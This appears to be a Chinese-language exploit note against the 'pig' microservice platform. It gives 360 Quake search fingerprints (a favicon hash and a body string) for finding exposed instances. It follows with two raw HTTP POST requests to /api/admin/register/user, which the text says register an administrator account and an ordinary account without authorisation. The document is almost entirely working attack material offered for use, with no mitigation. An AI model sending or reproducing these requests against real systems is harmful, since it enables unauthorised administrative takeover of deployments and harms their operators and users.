360quake
```
favicon: "9951a3501374127a765e781c05bb5408"
body: "pig微服务"
```

使用该poc注册管理员权限用户
```
POST /api/admin/register/user HTTP/1.1
Host: 
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Priority: u=0, i
Connection: close
Content-Length: 141

{"userId":"1387","username":"user","password":"admin123", "create_by":"admin", "update_by":"admin","post":["1"],"role":["1"] }
```

使用该poc注册普通权限用户
```
POST /api/admin/register/user HTTP/1.1
Host: 
Cookie: tenantId=1
Content-Length: 84
Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Accept: application/json, text/plain, */*
Content-Type: application/json
Tenant-Id: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: 
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Priority: u=1, i
Connection: close

{"username":"user","password":"admin123","phone":"15896235412","checked":true}
```